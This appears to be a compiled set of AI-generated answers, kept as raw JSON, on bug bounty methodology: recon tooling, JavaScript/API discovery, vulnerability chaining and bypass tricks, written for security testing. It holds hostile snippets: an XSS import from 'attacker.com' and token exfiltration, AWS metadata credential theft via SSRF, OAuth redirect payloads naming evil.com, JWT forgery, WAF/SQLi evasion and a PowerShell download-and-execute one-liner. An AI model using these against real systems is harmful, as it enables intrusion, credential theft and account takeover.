# NahamSec Methodology: Advanced Deep Dive

## 1. Advanced Recon & Asset Discovery

{"status":"success","answer":"Here is a deep technical dive into **Relentless Reconnaissance**, synthesizing advanced workflows and syntax from the provided sources.\n\n### 1. Advanced Tooling Syntax & Configuration\nEffective reconnaissance requires moving beyond default settings to maximize asset discovery through aggressive enumeration and permutation.\n\n**Amass (The Engine)**\nAmass should be treated as an ecosystem, not just a scanner. It uses a cyclic process where findings from one source feed others.\n*   **Intelligence Mode (Horizontal):** Map the target's IP space and root domains using ASN.\n    ```bash\n    amass intel -asn [ASN_NUMBER] -whois -d [ROOT_DOMAIN]\n    ```\n*   **Enumeration Mode (Vertical):** For deep subdomain discovery.\n    *   **Active Mode:** Enables direct interaction (certificate pulling, zone transfers) rather than just passive scraping [1].\n    *   **Brute-Forcing:** Enable recursive brute-forcing to find nested subdomains (e.g., `dev.api.target.com`).\n    *   **Config File:** Crucial for API keys and resolver limits. Jeff Foley recommends increasing the resolver count significantly (e.g., using `dnsvalidator` to generate a list of 9,000+ resolvers) and tuning `-max-dns-queries` to around 20,000 for high performance [2], [3].\n    ```bash\n    amass enum -active -d target.com -brute -w [WORDLIST] -rf resolvers.txt -config config.ini\n    ```\n*   **Scripting Engine:** You can write custom Lua scripts (saved as `.eds`) to introduce new data sources or wrap external tools (like `assetfinder`) directly into the Amass engine [4], [5].\n\n**Subfinder & Chaos**\nSubfinder is optimized for speed and passive sources.\n*   **Configuration:** Always configure the `provider-config.yaml` with API keys (e.g., SecurityTrails, GitHub, Chaos) to unlock deep data that isn't available anonymously [6], [7].\n*   **Syntax:**\n    ```bash\n    subfinder -d target.com -all -config config.yaml -silent\n    ```\n\n**MassDNS & ShuffleDNS**\nMassDNS is the backbone for high-speed resolution, often wrapped by **ShuffleDNS** for easier handling of wildcards and wordlists.\n*   **Workflow:** Generate a massive list of potential subdomains using permutations, then pipe to ShuffleDNS to resolve them against a list of trusted resolvers.\n*   **ShuffleDNS Syntax:**\n    ```bash\n    shuffledns -d target.com -w [WORDLIST] -r resolvers.txt -mode bruteforce\n    ```\n    *   *Note:* This handles wildcard filtering automatically, which is critical when brute-forcing large targets [8].\n\n**PureDNS / DNSx**\nUsed for cleaning and validating data sets.\n*   **DNSx:** Can be used to check liveness (A records) and probe for CNAMEs (useful for subdomain takeovers) [9].\n    ```bash\n    cat subdomains.txt | dnsx -resp -a -cname -silent\n    ```\n\n---\n\n### 2. Horizontal vs. Vertical Correlation Workflow\n\"Going Wide\" (Horizontal) vs. \"Going Deep\" (Vertical) requires distinct data sources.\n\n**Horizontal Correlation (Finding the Roots)**\nThe goal is to find every root domain (`target-corp.com`, `target-acq.com`) owned by the entity.\n1.  **ASN Mapping:** Use `bgp.he.net` or Amass Intel to find the Autonomous System Numbers. Scanning the entire IP range of an ASN can reveal shadow assets not linked via DNS [10].\n2.  **Reverse WHOIS:**\n    *   Identify the registrant email (e.g., `domains@target.com`) or Organization Name from a known domain.\n    *   Use tools like **Whoxy** (via API) or **DOMLink** to recursively find all other domains registered by that entity [11], [12].\n    *   *Tip:* Look for \"Copyright [Year] Target Inc\" in Google Dorks to find acquisition domains [13].\n3.  **Ad/Analytics Correlation:** Use **BuiltWith** to find sites sharing the same unique Google Analytics or New Relic tracking codes. This often reveals marketing sites or unadvertised subsidiaries [14].\n\n**Vertical Correlation (Subdomain Permutations)**\nOnce you have the roots, you must generate candidates that wordlists miss.\n1.  **Contextual Permutation:** Tools like **AltDNS** or **Regulator** take known subdomains (e.g., `api.target.com`) and mutate them based on common naming conventions (e.g., `api-dev.target.com`, `api-staging.target.com`) [15], [16].\n2.  **Recursive Search:** If you find `admin.target.com`, assume `dev.admin.target.com` exists. Use tools like **DNSGen** to pipe resolved domains back into a mutator for a second pass [17].\n\n---\n\n### 3. Finding 'Shadow IT' via Censys & Shodan\nThis technique bypasses DNS completely to find assets that are internet-facing but not clearly linked to the main domain.\n\n**Shodan Advanced Queries**\n*   **Favicon Hashing (Favihash):** Calculate the MurmurHash of the target's favicon. Query Shodan to find every IP exposing that icon, which often reveals dev servers, internal tools, or IP-only hosts.\n    *   Query: `http.favicon.hash:[HASH]` [18].\n*   **SSL/Org Filtering:**\n    *   `ssl:\"Target Name\"`: Finds infrastructure using self-signed or organization-issued certs [19].\n    *   `org:\"Target Inc\"`: Limits results to their specific IP blocks.\n*   **Header Fingerprinting:** If the target uses specific headers (e.g., `X-Powered-By: CustomApp`), query Shodan for that header key/value pair to find isolated instances [20].\n\n**Cloud Range Scanning**\n*   **Technique:** Download IP ranges for AWS, GCP, and Azure. Use tools like **Masscan** or **ZMap** to scan port 443 across these massive ranges.\n*   **Extraction:** Pull the SSL certificate from every open port. Grep the CN (Common Name) or SAN (Subject Alternative Name) for your target's keywords. This detects ephemeral dev instances spun up by engineers that haven't been linked to the main DNS yet [21].\n\n---\n\n### 4. Effective Pipeline Automation\nAutomation should focus on \"Lead Generation\"—alerting you to anomalies rather than just attempting to exploit.\n\n**The \"Anew\" Loop**\nUse TomNomNom's `anew` tool to manage state. This ensures you only process *new* findings in subsequent scans.\n*   **Workflow:**\n    1.  Run Subfinder/Amass.\n    2.  Pipe output to `anew all_subs.txt`.\n    3.  Pipe the *output* of `anew` (which is only the new lines) into **Notify** (ProjectDiscovery) to send alerts to Discord/Slack [22], [23].\n    ```bash\n    subfinder -d target.com | anew all_subs.txt | notify -provider discord\n    ```\n\n**Distributed Scanning (Axiom)**\nFor heavy lifting (brute-forcing or port scanning large CIDRs), use **Axiom** to spin up a fleet of disposable VPS instances (digital ocean droplets).\n*   **Concept:** Split a wordlist or target list into small chunks, distribute them to 20+ instances, scan in parallel, and merge results.\n*   **Usage:**\n    *   `axiom-fleet`: Spin up instances.\n    *   `axiom-scan targets.txt -m subfinder -o output.txt`: Distributed scanning.\n    *   This reduces scans that would take days on a single machine to minutes [24].\n\n**The \"Meg\" Approach**\nInstead of crawling entire sites, use **Meg** to fetch specific paths (e.g., `/robots.txt`, `/security.txt`, `.env`) across thousands of hosts simultaneously.\n*   **Strategy:** Combine `Meg` with `grep`. Fetch the root page of every subdomain and grep for \"Dashboard\", \"Admin\", or specific software versions to prioritize which assets to manually audit [25].\n\n**Continuous Monitoring**\nSet up cron jobs to run the pipeline daily.\n*   **Diffing:** Compare HTTP response content lengths or titles over time using `httpx`. If a 403 Forbidden suddenly becomes a 200 OK, or the content length changes drastically, alert immediately [26].","conversation_id":"3a4149c5-4df2-4578-8bde-2cbcb8171e4f"}

---

## 2. JavaScript Analysis & API Discovery

{"status":"success","answer":"Based on the provided transcripts, here is the methodology for extracting hidden value from JavaScript and APIs, ranging from static analysis to advanced fuzzing strategies.\n\n### 1. JavaScript Analysis: Manual vs. Automated\n\nThe most effective approach combines both manual and automated analysis to uncover endpoints, logic, and secrets.\n\n**Automated Static Analysis**\nAutomation is best used for broad discovery and initial parsing.\n*   **Purpose:** To quickly extract endpoints, links, and variable names from large sets of JavaScript files without reading every line [1].\n*   **Limitations:** Automated tools can lack context. They might find an endpoint but won't tell you *how* it interacts with the application or what parameters are required [2, 3].\n*   **Technique:** Use tools to \"beautify\" or \"un-minify\" code first, then run parsers to strip out URLs and relative paths [4].\n\n**Manual Static Analysis**\nManual review is critical for understanding business logic and finding complex bugs.\n*   **Methodology:** Read the code to understand the \"sources\" (inputs) and \"sinks\" (where data executes) [5].\n*   **Targeted Approach:** Instead of reading everything, use browser DevTools to search for specific keywords like `api`, `v1`, `post`, or `get` within the loaded JS files [6, 7].\n*   **The \"Renniepak\" Method:** A highly recommended manual/hybrid technique involves using a custom browser bookmarklet to extract all endpoints from the *current* page's JavaScript context. This results in more focused testing data than blind scraping [8-10].\n*   **Developer Comments:** manually look for comments like `// TODO`, `FIXME`, or notes about \"internal\" endpoints, as developers often leave clues about future or hidden features [11].\n\n### 2. Grep and Regex Patterns for Secrets and Endpoints\n\nUsing `grep` or specialized tools to hunt for specific patterns is standard practice for finding leaks.\n\n**Key Patterns to Search:**\n*   **API Routes:** Search for `API/`, `v1/`, `v2/`, `graphql`, or `swagger` to find hidden routes [12-14].\n*   **Sensitive Keywords:** Grep for terms like `access_key`, `secret`, `token`, `authorization`, `bearer`, and `password` [15-17].\n*   **Cloud Keys:**\n    *   **AWS:** Look for `AKIA` followed by alphanumeric characters [18].\n    *   **Google Cloud (GCP):** Use regex for keys starting with `AIza` followed by 35 characters (alphanumeric, dashes, underscores) [18].\n*   **Parameters:** Search for `var [name] =` or `const [name] =` to identify variable assignments that might control application logic or feature flags [19].\n\n**Tooling for Patterns:**\n*   **GF (Grep Fuzz):** A wrapper around grep that allows you to use pre-defined pattern files (e.g., for AWS keys or potential XSS sinks) against a large list of files or URLs [20].\n\n### 3. Reconstructing API Documentation & Source Mapping\n\nWhen documentation is missing, you can reconstruct it using artifacts left in the production build.\n\n**Source Mapping**\n*   **Concept:** Modern web apps (React, Vue) are often minified and bundled (e.g., webpack). Developers sometimes accidentally leave `.map` files (Source Maps) on the server.\n*   **Methodology:** If you find a source map, you can reconstruct the original, un-minified code structure. This restores the original file names and directory structure, making it much easier to find vulnerabilities [21, 22].\n*   **Tool:** **Source Mapper** is a Go tool specifically mentioned for feeding in a source map and spitting out the original JavaScript file tree [22].\n\n**Reconstructing from Spec Files**\n*   **Swagger/OpenAPI:** Actively hunt for `swagger.json`, `application.wadl`, or `api-docs`. These files act as a roadmap, listing every endpoint and parameter [12, 14].\n*   **Introspection:** For GraphQL, if introspection is disabled, you can use tools (like *Clairvoyance*) that use \"field suggestion\" fuzzing (sending a wrong field to see if the server suggests the correct one) to reconstruct the schema [23, 24].\n\n### 4. Advanced Fuzzing Strategies\n\nEffective fuzzing is not just random guessing; it requires context and intelligent filtering.\n\n**Contextual Wordlists**\n*   **Custom Wordlists:** Do not rely solely on generic lists. Build wordlists based on the technology stack (e.g., if Wappalyzer sees Spring Boot, use a Spring Boot list) [25].\n*   **Scraping for Words:** Use tools to scrape the target website's HTML and JS for unique words (function names, variable names) to create a target-specific dictionary [26, 27].\n*   **Scavenger:** A Burp Suite extension that creates a wordlist from the parameters and endpoints found in your proxy history [28].\n\n**Filtering Output**\n*   **Beyond Status Codes:** Do not just look for `200 OK`. Filter by **Content Length** or **Word Count**. If 99% of requests return 100 bytes, the one request that returns 105 bytes is the anomaly you want to investigate [29].\n*   **Error Codes:** Pay attention to `400`, `405` (Method Not Allowed), and `415` (Unsupported Media Type). These often indicate the resource exists but requires a different HTTP method (e.g., POST instead of GET) or Content-Type (JSON vs XML) [30, 31].\n\n**403/401 Bypass Handling**\n*   **Recursion:** If you hit a `403 Forbidden` on `/admin`, do not stop. Fuzz *deeper* (e.g., `/admin/FUZZ`). You might have access to a subdirectory even if the parent is blocked [32, 33].\n*   **Headers & Encoding:**\n    *   Try headers like `X-Forwarded-For: 127.0.0.1` or `X-Custom-IP-Authorization` [34].\n    *   Use URL encoding variations (e.g., `%2e` for dot) or path traversals (`..;/`) to bypass WAF rules [35, 36].\n    *   Check for older API versions (e.g., if `v2` is 403, check `v1`) [37].\n\n### 5. Essential Tools and Usage\n\n**Katana (Crawler)**\n*   **Usage:** A fast crawler used to map out the application. It is distinct because it can crawl JavaScript files (`-jc` flag) to find endpoints.\n*   **Strategy:** Use it for **active crawling**. If you have credentials, pass them to Katana (e.g., via cookies) to crawl authenticated areas of the application, which often reveals more API endpoints than unauthenticated crawling [38-40].\n\n**GAP (Burp Extension)**\n*   **Usage:** It parses endpoints, links, and parameters from your Burp Suite site map or proxy history.\n*   **Strategy:** Right-click a target in Burp and \"Send to GAP.\" It produces a massive link list that is easy to copy-paste for further fuzzing. It bridges the gap between manual browsing and automated parameter discovery [41].\n\n**LinkFinder / JS Link Finder**\n*   **Usage:** Python script (or Burp extension) designed to extract endpoints from JS files using regex.\n*   **Strategy:** Feed it a JavaScript URL (e.g., `main.js`). It will output a list of paths found within the code (e.g., `/api/v1/user`). This is the \"go-to\" tool for analyzing JS files for hidden API routes [42, 43].\n\n**Waymore**\n*   **Usage:** Retrieves historical URLs from sources like the Wayback Machine and Common Crawl.\n*   **Strategy:** Use it to find \"dead\" endpoints or developer files that were once public. Unlike standard wayback tools, Waymore can also download the *content* of the responses, allowing you to grep for secrets in historical versions of a page [44-46].\n\n**FFUF (Fuzz Faster U Fool)**\n*   **Usage:** A fast web fuzzer for directory and parameter brute-forcing.\n*   **Strategy:** Use the `-ac` flag for auto-calibration to filter out false positives. Use the `-recursion` flag to automatically fuzz subdirectories when a directory is found [47, 48]. Combine it with `grep` to filter specific status codes (e.g., `-mc 200,401,403`) [49].","conversation_id":"8bc40d8a-c0a8-44c5-8493-199c2294ac92"}

---

## 3. Critical Vulnerability Chaining & Escalation

{"status":"success","answer":"To escalate vulnerabilities to High or Critical severity, you must shift your objective from simply proving a bug exists (e.g., popping an alert box) to demonstrating maximum business impact, such as data exfiltration, internal infrastructure access, or account takeover (ATO).\n\nThe following methodology details how to chain and escalate specific vulnerability classes based on the provided sources.\n\n### 1. IDOR Chains: From Enumeration to Account Takeover\nInsecure Direct Object References (IDORs) are often dismissed as medium severity if they only leak minor data. To escalate these to Critical, you must demonstrate the ability to modify data or access sensitive PII at scale.\n\n*   **Targeting \"Hidden\" API Endpoints:** IDORs often exist in API endpoints not visible in the main UI. By identifying endpoints like `/api/users/` or `/api/locations` that return user objects, you can fuzz user IDs (integers or UUIDs) to leak sensitive PII such as email addresses, phone numbers, and national IDs [1], [2].\n    *   *Escalation Technique:* If an API endpoint requires a username rather than a numeric ID, use automation to generate lists of common names or iterate through years (e.g., 1960–1999) to dump the database. This turns a single IDOR into a massive data breach [3].\n*   **Cross-Environment ID Reuse:** In some cases, user IDs (like `id: 6`) are consistent across Production and Development environments. If you can register on a less secure Dev environment and obtain a valid session or token, you may be able to swap that token into the Production environment to log in as the victim with the same ID, effectively achieving ATO [4].\n*   **The Invite Logic Chain:** A potent escalation involves \"Invite\" functionality in SaaS applications. If you can invite an existing user to your organization, check if you can modify their attributes.\n    *   *Escalation Technique:* As an admin of your own org, invite a victim. If the system allows you to modify the email address of users in *your* org, change the victim's email to one you control, then initiate a password reset to take over their account completely [5].\n*   **Nested Object Access (GraphQL):** If a direct query for a sensitive object (like a credit card) is blocked, try accessing it through nested relationships. For example, query `Organization -> Account -> Balance`. You might be denied access to the root object but granted access when traversing through a parent object [6].\n\n### 2. XSS Escalation: Weaponizing JavaScript\nTo escalate Cross-Site Scripting (XSS), you must move beyond `alert(1)` and prove you can perform actions on behalf of the user or steal their session.\n\n*   **Stealing Authentication Tokens:** Modern apps often use HTTP-only cookies, making `document.cookie` useless. However, they frequently store API keys or JSON Web Tokens (JWTs) in local storage or fetch them via background API calls (e.g., `/api/me`).\n    *   *Escalation Technique:* Write a payload that uses `fetch()` or `XMLHttpRequest` to query `/api/me`, parse the JSON response to extract the JWT/API key, and exfiltrate it to your attacker server [7], [8].\n*   **The Email Change Chain:** If you cannot steal a session token, force a permanent account takeover.\n    *   *Escalation Technique:* Script a payload that sends two requests: first, change the victim's email address to one you control; second, trigger a \"Forgot Password\" request. The reset link will be sent to your email, allowing full ATO [9], [10].\n*   **Blind XSS for Internal Access:** Inject payloads into fields likely to be viewed by admins or support staff, such as \"Delivery Notes,\" \"Support Tickets,\" or \"User-Agent\" strings.\n    *   *Escalation Technique:* Do not use `alert(1)` as you will never see it fire. Use a payload that imports an external script (e.g., `import('//attacker.com/payload.js')`). This allows you to collect the admin's DOM content, screenshots, and internal IP address, proving you have touched internal tools [11], [12].\n*   **Bypassing CORS to Leak PII:** Even if you have XSS, reading data is limited by Same-Origin Policy. However, if the target has a misconfigured CORS policy (e.g., allowing any subdomain), you can host your XSS payload on a vulnerable endpoint and read sensitive PII (like billing addresses) from a different protected endpoint [13], [14].\n\n### 3. SSRF Exploitation: Hitting the Cloud and Internal Network\nServer-Side Request Forgery (SSRF) escalates to Critical when you can prove access to cloud metadata or internal infrastructure.\n\n*   **Cloud Metadata Extraction:**\n    *   **AWS:** Target `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to steal temporary AWS credentials [15], [16]. Note that you may need to bypass filters by using DNS redirection (pointing your domain to the metadata IP) [17].\n    *   **GCP:** Google Cloud requires the header `Metadata-Flavor: Google`. This is difficult to exploit via basic SSRF unless you have a header injection vulnerability or an open redirect that preserves headers. You can query endpoints like `computeMetadata/v1/` [18], [19].\n*   **Chaining with Open Redirects:** Many SSRF filters block internal IP addresses but allow external domains.\n    *   *Escalation Technique:* Use an Open Redirect on a whitelisted domain. For example, if the server allows `ibm.com`, find a redirect on `ibm.com` (e.g., `ibm.com/logout?redirect=http://169.254.169.254`) to trick the parser into hitting the internal resource [20].\n*   **Protocol Smuggling and PDF Generators:** If the target uses a PDF generator (like WeasyPrint), inject HTML that forces the server to fetch local files or hit internal metadata services. You can identify the backend by forcing it to request your server and checking the User-Agent [21], [22].\n*   **Internal Port Scanning:** Use the SSRF to scan for internal services like Kubernetes (Port 10250), Docker APIs, or databases. Hitting these services often returns distinct error messages or banners compared to closed ports [23].\n\n### 4. Logic Flaws & Race Conditions: Breaking the Flow\nThese require deep understanding of the application's business logic rather than just technical injection.\n\n*   **Mass Assignment (Privilege Escalation):** When registering or updating a profile, applications often bind client-side JSON directly to internal objects.\n    *   *Escalation Technique:* Fuzz the API request by adding parameters like `\"role\": \"admin\"`, `\"is_admin\": true`, or `\"account_type\": \"pro\"`. If the backend doesn't filter these, you can instantly escalate privileges [24], [25].\n*   **OAuth Logic Flaws:**\n    *   *Normalization Attacks:* Some systems treat `victim@gmail.com` and `victim+1@gmail.com` as different during login but the same during account lookup. By registering with the manipulated email, you might log into the victim's account [26].\n    *   *Pre-Account Takeover:* If an application allows Login with Social Media (e.g., GitLab) but doesn't verify email ownership, you can register an account with a victim's email address *before* they do. When they later try to sign in via OAuth, you may control the account [27].\n*   **Response Queue Poisoning (HTTP Desync):** In complex architectures involving load balancers, sending a malformed request (Request Smuggling) can desynchronize the socket.\n    *   *Escalation Technique:* By smuggling a complete request, you can \"steal\" the response intended for the *next* user. This can leak the victim's session cookies or PII directly into your response stream [28], [29].\n*   **Race Conditions:** Look for features involving limits, such as applying coupons, transferring funds, or redeeming gift cards. Using tools like Turbo Intruder to send simultaneous requests can exploit the time gap between checking a limit and updating the database, allowing you to perform actions multiple times [30].","conversation_id":"1a353d30-1161-4b2d-9b04-d6628364ae77"}

---

## 4. Advanced Bypasses & Tricks

{"status":"success","answer":"Here are the specific hacker tricks, bypass techniques, and one-liners extracted from the provided sources.\n\n### 403/401 Bypass Checklists\nThese techniques are used to access restricted endpoints (like `/admin` or internal APIs) by manipulating the HTTP request to trick the server or proxy.\n\n**Path and URL Manipulation**\n*   **Path Normalization:** If `/admin` returns a 403, try accessing it via `/secure/./admin` or `/secure/../admin`. Some proxies normalize this differently than the backend, allowing access [1], [2].\n*   **URL Encoding:** Encode specific characters in the path. Try converting `/` to `%2f`, `.` to `%2e`, or using double encoding like `%252f` or `%252e` [3], [4].\n*   **Case Sensitivity:** On case-insensitive backends (like Windows/IIS) behind case-sensitive proxies, try changing casing (e.g., `/Admin` instead of `/admin`) [5].\n*   **Trailing Dot:** In some cases, adding a trailing dot to a domain (e.g., `example.com.`) causes the backend to treat it as an absolute domain while the filter sees it as a relative domain or mismatch [6].\n*   **Microsoft HTTP API 2.0 (IIS) Trick:** If you see a generic \"Microsoft HTTP API 2.0\" 404 error when hitting an IP, find a valid internal subdomain from the SSL certificate and set it as the `Host` header. This can route you to the hidden application [7], [8].\n\n**Header Manipulation**\n*   **Originating IP Headers:** Use headers to spoof your IP address to bypass IP-based restrictions (e.g., `X-Forwarded-For: 127.0.0.1`, `X-Client-IP`, `X-Real-IP`) [9].\n*   **Content-Type Swapping:** If a WAF or filter blocks specific requests, try changing the `Content-Type` header (e.g., from `application/json` to `text/plain` or `application/x-www-form-urlencoded`). This can sometimes bypass restrictions or trigger different parsing logic [10], [11].\n*   **Recursive Fuzzing:** If you hit a 401 on a directory (e.g., `/admin`), do not stop. Recursively brute-force deeper paths (e.g., `/admin/dashboard` or `/admin/users`), as misconfigurations often leave deeper endpoints unprotected [12], [13].\n\n---\n\n### WAF Evasion Techniques\nThese techniques are designed to slip payloads past Web Application Firewalls.\n\n**General & XSS Evasion**\n*   **WAF Padding (Request Size Limits):** WAFs often only inspect the first 8KB to 128KB of a request body for performance reasons. You can bypass this by padding the beginning of your POST body with junk data (e.g., 8KB of comments) before your actual payload [14], [15], [16].\n    *   *Tool Tip:* The Burp extension \"No WAF Please\" automates this padding [17], [18].\n*   **Unicode Escapes:** In JavaScript contexts, use Unicode escapes (e.g., `\\u0061` for 'a') to hide keywords like `alert` from the WAF [19].\n*   **Content-Type Mismatch:** Submitting payloads with `Content-Type: text/plain` can sometimes bypass WAFs that only inspect JSON or HTML forms, while the backend still processes the data as HTML/Script [11], [20].\n*   **Filter Collision:** Exploit backend sanitization. If a backend removes specific characters (like stripping `<script>` tags), craft a payload that becomes valid *after* the deletion (e.g., `<scr<script>ipt>`) [21], [22].\n\n**SQL Injection Evasion**\n*   **Space Removal:** If spaces are blocked, replace them with comments (`/**/`), newlines, tabs, or parenthesis (e.g., `SELECT(user)FROM(users)`) [23], [24].\n*   **Scientific Notation/Math:** Replace integers with mathematical operations (e.g., `true+true` equals 2) or hex values to bypass keyword filters [25].\n*   **Double Encoding:** If the WAF decodes once but the backend decodes twice, double URL encode characters (e.g., `%2527` for a single quote `'`) to slip payloads through [26], [27].\n\n---\n\n### Authentication Bypasses\nTechniques to bypass login screens, OAuth flows, and token validation.\n\n**OAuth Flaws**\n*   **Redirect URI Manipulation:**\n    *   Concatenate attacker domains using `@` (e.g., `evil.com@target.com`) [28].\n    *   Use double slashes or fake relative paths (e.g., `//attacker.com`) [29].\n    *   Inject encoded newlines (`%0a`) if the regex is not set to multiline [28].\n*   **Response Mode Attacks:** Change the `response_mode` parameter in the OAuth URL to `fragment`, `form_post`, or `web_message` to change how the token is delivered, potentially bypassing client-side validation [30], [31].\n*   **Login CSRF:** Initiate a login flow, stop it before the final step, and send the link to a victim to log them into *your* account. This is useful for linking the victim's external accounts (like Google Calendar) to your account [32], [33].\n\n**JWT & Token Attacks**\n*   **Algorithm Confusion:** Change the JWT header algorithm from `RS256` to `HS256` and sign the token using the server's public key (if exposed). The server may verify it using the public key as an HMAC secret [34], [35].\n*   **The \"None\" Algorithm:** Set the `alg` header to `none` and remove the signature. Some libraries will accept this as a valid unsecured token [36].\n*   **Environment Reuse:** Tokens generated in a Dev or Staging environment (which are often easier to compromise) sometimes share the same secret key as Production. Try using a Dev token on the Prod environment [37].\n\n**Logic & Other Bypasses**\n*   **Mass Assignment:** During registration or profile updates, try adding parameters like `{\"role\": \"admin\"}`, `{\"is_admin\": true}`, or `{\"account_type\": \"pro\"}` to escalate privileges [38], [39].\n*   **Punycode Account Takeover:** Register a domain that looks identical to a target domain using Punycode (e.g., using a Cyrillic 'a'). This can trick normalization logic during password resets or OAuth callbacks [40], [41].\n*   **2FA Bypass via Response Manipulation:** Intercept the response of a failed 2FA attempt and replace it with the response body/headers from a successful login (from your own account). Some apps only check the client-side response [42].\n\n---\n\n### Useful 'One-Liner' Shell Commands\nCommands for data wrangling and recon automation.\n\n*   **URL Parsing (Unfurl):**\n    *   Extract paths from a list of URLs: `cat urls.txt | unfurl paths` [43].\n    *   Extract query keys (parameters): `cat urls.txt | unfurl keys` [43].\n    *   Format output (e.g., domain:port): `cat urls.txt | unfurl format %d:%P` [44].\n*   **Data Filtering (JQ & Grep):**\n    *   Extract URLs with more than 2 parameters: `cat urls.txt | unfurl json | jq -r 'select(.parameters | length > 2) | .url'` [45].\n    *   Find specific patterns (e.g., \"admin\") in a file list: `grep -r \"admin\" .` [46].\n*   **PowerShell Downloads (Living off the Land):**\n    *   Download and invoke a script directly into memory (bypass disk): `IWR <url> | IEX` (Invoke-WebRequest pipe to Invoke-Expression) [47].\n    *   Use `certreq` to download files if `IWR` is blocked: A technique using the certificate request tool to download remote content [48].\n*   **IIS Shortname Scanning:**\n    *   Use tilde (`~`) enumeration to find hidden files: `OPTIONS /folder~1` to check if a file exists based on 404 vs 200 response codes [49], [50].","conversation_id":"30e2ed06-9e7d-4b5f-a32e-891e03a7c6f5"}

---

